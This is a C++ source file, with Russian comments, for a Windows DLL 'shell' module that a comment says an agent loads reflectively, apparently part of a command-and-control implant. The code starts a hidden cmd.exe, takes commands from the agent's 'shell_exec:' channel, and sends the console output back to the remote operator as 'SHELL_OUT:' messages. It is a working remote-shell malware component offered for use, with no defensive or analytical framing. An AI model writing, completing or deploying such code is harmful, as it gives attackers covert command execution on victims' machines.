// Modules/shell/shell.cpp — исправленная версия: конвертация OEM->UTF-8, отправка текста без base64
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <algorithm>

#pragma comment(lib, "crypt32.lib")

struct ModuleAPI {
    void (*send_result)(const unsigned char* data, unsigned long long len);
    void (*log)(const char* msg);
    const char* (*get_command)(const char* key);
};

static volatile bool g_running = true;
static volatile bool g_shell_active = false;
static CRITICAL_SECTION g_cs;
static HANDLE g_hInputWrite = NULL;
static HANDLE g_hOutputRead = NULL;
static HANDLE g_hProcess = NULL;
static HANDLE g_hReadThread = NULL;
static HANDLE g_hWriteThread = NULL;

static void (*g_send_result)(const unsigned char*, unsigned long long) = nullptr;
static void (*g_log)(const char*) = nullptr;
static const char* (*g_get_command)(const char*) = nullptr;

void sh_log(const char* msg) {
    CreateDirectoryA("C:\\temp", NULL);
    HANDLE h = CreateFileA("C:\\temp\\shell.log", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        SetFilePointer(h, 0, NULL, FILE_END);
        DWORD w; WriteFile(h, msg, (DWORD)strlen(msg), &w, NULL);
        CloseHandle(h);
    }
    if (g_log) g_log(msg);
}

DWORD WINAPI ReadThread(LPVOID) {
    sh_log("SHELL: ReadThread started\n");
    char buffer[65536];
    DWORD bytes_available = 0;
    DWORD read = 0;

    while (g_running && g_shell_active) {
        if (!g_hOutputRead) { Sleep(100); continue; }
        
        if (!PeekNamedPipe(g_hOutputRead, NULL, 0, NULL, &bytes_available, NULL)) {
            if (GetLastError() == ERROR_BROKEN_PIPE) {
                sh_log("SHELL: Pipe closed\n");
                break;
            }
            Sleep(50); continue;
        }

        if (bytes_available == 0) {
            Sleep(20);
            continue;
        }

        if (ReadFile(g_hOutputRead, buffer, sizeof(buffer) - 1, &read, NULL) && read > 0) {
            // Конвертируем OEM (CP_OEMCP) в UTF-8
            int wlen = MultiByteToWideChar(CP_OEMCP, 0, buffer, read, NULL, 0);
            if (wlen > 0) {
                std::vector<wchar_t> wbuf(wlen);
                MultiByteToWideChar(CP_OEMCP, 0, buffer, read, wbuf.data(), wlen);
                int ulen = WideCharToMultiByte(CP_UTF8, 0, wbuf.data(), wlen, NULL, 0, NULL, NULL);
                if (ulen > 0) {
                    std::string utf8(ulen, 0);
                    WideCharToMultiByte(CP_UTF8, 0, wbuf.data(), wlen, &utf8[0], ulen, NULL, NULL);
                    // Убираем нуль-терминатор
                    if (!utf8.empty() && utf8.back() == '\0') utf8.pop_back();
                    std::string payload = "SHELL_OUT:" + utf8 + "\n";
                    g_send_result((const unsigned char*)payload.c_str(), payload.length());
                }
            } else {
                // Fallback: отправить исходные байты (но они могут быть кракозябрами)
                std::string payload = "SHELL_OUT:" + std::string(buffer, read) + "\n";
                g_send_result((const unsigned char*)payload.c_str(), payload.length());
            }
        } 
        else {
            if (GetLastError() == ERROR_BROKEN_PIPE) break;
            Sleep(50);
        }
    }
    sh_log("SHELL: ReadThread exited\n");
    return 0;
}

DWORD WINAPI WriteThread(LPVOID) {
    sh_log("SHELL: WriteThread started\n");
    while (g_running && g_shell_active) {
        if (g_get_command) {
            const char* cmd = g_get_command("shell");
            if (cmd && strlen(cmd) > 0) {
                if (strstr(cmd, "shell_stop")) {
                    g_shell_active = false;
                    break;
                } else if (strstr(cmd, "shell_exec:")) {
                    const char* exec_cmd = strstr(cmd, "shell_exec:") + 11;
                    if (g_hInputWrite && strlen(exec_cmd) > 0) {
                        char full_cmd[4096];
                        sprintf_s(full_cmd, "%s\r\n", exec_cmd);
                        DWORD written = 0;
                        WriteFile(g_hInputWrite, full_cmd, (DWORD)strlen(full_cmd), &written, NULL);
                    }
                }
            }
        }
        Sleep(50);
    }
    sh_log("SHELL: WriteThread stopped\n");
    return 0;
}

bool start_shell() {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hInputRead, hOutputWrite;

    if (!CreatePipe(&hInputRead, &g_hInputWrite, &sa, 0) ||
        !CreatePipe(&g_hOutputRead, &hOutputWrite, &sa, 0)) {
        sh_log("SHELL: Failed to create pipes\n");
        return false;
    }

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = hInputRead;
    si.hStdOutput = hOutputWrite;
    si.hStdError = hOutputWrite;

    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        sh_log("SHELL: Failed to start cmd.exe\n");
        CloseHandle(hInputRead); CloseHandle(g_hInputWrite);
        CloseHandle(g_hOutputRead); CloseHandle(hOutputWrite);
        return false;
    }

    CloseHandle(hInputRead);
    CloseHandle(hOutputWrite);
    CloseHandle(pi.hThread);

    g_hProcess = pi.hProcess;
    g_shell_active = true;

    g_hReadThread = CreateThread(NULL, 0, ReadThread, NULL, 0, NULL);
    g_hWriteThread = CreateThread(NULL, 0, WriteThread, NULL, 0, NULL);

    sh_log("SHELL: Started\n");
    return true;
}

void stop_shell() {
    g_shell_active = false;
    if (g_hProcess) {
        TerminateProcess(g_hProcess, 0);
        WaitForSingleObject(g_hProcess, 2000);
    }
    if (g_hReadThread) WaitForSingleObject(g_hReadThread, 2000);
    if (g_hWriteThread) WaitForSingleObject(g_hWriteThread, 2000);
    
    if (g_hInputWrite) CloseHandle(g_hInputWrite);
    if (g_hOutputRead) CloseHandle(g_hOutputRead);
    if (g_hProcess) CloseHandle(g_hProcess);
    if (g_hReadThread) CloseHandle(g_hReadThread);
    if (g_hWriteThread) CloseHandle(g_hWriteThread);

    g_hInputWrite = g_hOutputRead = g_hProcess = NULL;
    g_hReadThread = g_hWriteThread = NULL;
    sh_log("SHELL: Stopped\n");
}

//точка входа модуля, вызываемая агентом после рефлективной загрузки
extern "C" __declspec(dllexport) int __stdcall Run(ModuleAPI* api) {
    if (!api) return -1;
    // сохраняет указатели на функции агента в глобальные переменные
    g_send_result = api->send_result;
    g_log = api->log;
    g_get_command = api->get_command;

    InitializeCriticalSection(&g_cs);

    if (!start_shell()) {
        if (g_send_result) g_send_result((const unsigned char*)"SHELL_ERROR:Failed to start\n", 26);
        DeleteCriticalSection(&g_cs);
        return -1;
    }

    if (g_send_result) g_send_result((const unsigned char*)"SHELL_READY:Interactive shell started\n", 37);
    return 0;
}
// вызывается при загрузке ивыгрузке длл
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_DETACH) {
        g_running = false;
        stop_shell();
        DeleteCriticalSection(&g_cs);
    }
    return TRUE;
}